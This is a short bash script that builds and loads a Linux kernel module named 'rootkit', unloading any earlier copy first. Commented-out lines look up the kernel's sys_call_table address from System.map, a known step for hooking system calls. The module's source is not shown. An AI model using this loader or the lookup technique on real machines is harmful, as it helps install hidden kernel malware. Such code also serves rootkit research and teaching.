#!/bin/bash

make clean

#syscall_table=$(sudo cat /boot/System.map-5.0.0-37-generic | grep "\Wsys_call_table$" | cut -d " " -f 1)
#echo "#pragma once" > sys.h
#echo "void** sys_call_table = (void**)0x$syscall_table;" >> sys.h

make

if [ $? -eq 0 ]; then
	already=$(lsmod | grep rootkit)
	if [ -n "$already" ]; then
		echo "Removing already present rootkit"
		sudo rmmod rootkit
	fi
	sudo insmod rootkit.ko

	if [ $? -eq 0 ]; then
		echo "Done"
	else
		echo "FAIL insmod"
	fi
else
	echo "FAIL make"
fi

